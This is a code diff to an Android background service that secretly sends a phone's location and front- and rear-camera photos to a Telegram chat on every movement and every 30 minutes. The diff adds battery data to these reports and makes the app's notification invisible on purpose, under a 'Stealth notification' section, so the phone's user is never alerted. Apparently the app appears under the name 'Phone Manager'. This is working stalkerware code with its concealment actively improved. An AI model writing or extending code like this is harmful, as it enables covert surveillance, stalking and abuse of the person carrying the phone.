@@ -218,15 +218,16 @@ class LocationTrackingService : Service() {
                 val lat = location.latitude
                 val lng = location.longitude
                 val acc = location.accuracy
+                val battery = BatteryUtils.getInfo(applicationContext)
                 scope.launch {
                     try {
                         TelegramApi.sendMessage(
                             token, chatId,
-                            TelegramApi.buildOnlineWithLocationMessage(lat, lng, acc)
+                            TelegramApi.buildOnlineWithLocationMessage(lat, lng, acc, battery)
                         )
                     } catch (_: Exception) {}
                     // Capture + send camera photos without storing on device
-                    sendCameraPhotos(token, chatId)
+                    sendCameraPhotos(token, chatId, battery = battery)
                 }
                 return
             }
@@ -244,18 +245,20 @@ class LocationTrackingService : Service() {
                     val lat = location.latitude
                     val lng = location.longitude
                     val acc = location.accuracy
+                    val battery = BatteryUtils.getInfo(applicationContext)
                     scope.launch {
                         try {
                             val ok = TelegramApi.sendMessage(
                                 token, chatId,
-                                TelegramApi.buildLocationMessage(lat, lng, distance, acc)
+                                TelegramApi.buildLocationMessage(lat, lng, distance, acc, battery)
                             )
                             if (ok) {
                                 prefs().edit().putLong(Prefs.KEY_LAST_SENT_TIME, now).apply()
                                 // Send camera photos with every movement alert
                                 sendCameraPhotos(
                                     token, chatId,
-                                    TelegramApi.buildPhotoCaption(lat, lng, "Movement alert")
+                                    TelegramApi.buildPhotoCaption(lat, lng, "Movement alert", battery),
+                                    battery
                                 )
                             }
                         } catch (_: Exception) {}
@@ -270,19 +273,21 @@ class LocationTrackingService : Service() {
     private fun sendHeartbeat() {
         val loc = lastKnownLocation ?: return
         val (token, chatId) = credentials()
-        val lat = loc.latitude
-        val lng = loc.longitude
-        val acc = loc.accuracy
+        val lat     = loc.latitude
+        val lng     = loc.longitude
+        val acc     = loc.accuracy
+        val battery = BatteryUtils.getInfo(applicationContext)
         scope.launch {
             try {
                 TelegramApi.sendMessage(
                     token, chatId,
-                    TelegramApi.buildStationaryMessage(lat, lng, acc)
+                    TelegramApi.buildStationaryMessage(lat, lng, acc, battery)
                 )
                 // Send camera photos with every heartbeat too
                 sendCameraPhotos(
                     token, chatId,
-                    TelegramApi.buildPhotoCaption(lat, lng, "30-min heartbeat")
+                    TelegramApi.buildPhotoCaption(lat, lng, "30-min heartbeat", battery),
+                    battery
                 )
             } catch (_: Exception) {}
         }
@@ -293,7 +298,8 @@ class LocationTrackingService : Service() {
     private suspend fun sendCameraPhotos(
         token: String,
         chatId: String,
-        caption: String = ""
+        caption: String = "",
+        battery: BatteryInfo? = null
     ) {
         val cameras = listOf(
             CameraCharacteristics.LENS_FACING_BACK  to "📸 Rear camera",
@@ -356,8 +362,13 @@ class LocationTrackingService : Service() {
     // ─── Stealth notification ─────────────────────────────────────────────────
 
     private fun createNotificationChannel() {
+        // IMPORTANCE_NONE is the same state the OS sets when the user manually
+        // goes to Settings → Apps → Phone Manager → Notifications and turns
+        // them off.  Creating the channel with this importance from the start
+        // means no notification ever appears in the shade — no manual step
+        // required by the user.
         val ch = NotificationChannel(
-            CHANNEL_ID, " ", NotificationManager.IMPORTANCE_MIN
+            CHANNEL_ID, " ", NotificationManager.IMPORTANCE_NONE
         ).apply {
             description = ""
             setShowBadge(false)
@@ -365,8 +376,13 @@ class LocationTrackingService : Service() {
             enableLights(false)
             enableVibration(false)
         }
-        (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager)
-            .createNotificationChannel(ch)
+        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+        nm.createNotificationChannel(ch)
+
+        // Belt-and-suspenders: if a previous install left the channel at a
+        // higher importance, explicitly cancel every notification we own so
+        // the shade stays empty even on Samsung One UI / MIUI.
+        nm.cancel(NOTIFICATION_ID)
     }
 
     private fun buildStealthNotification(): Notification =
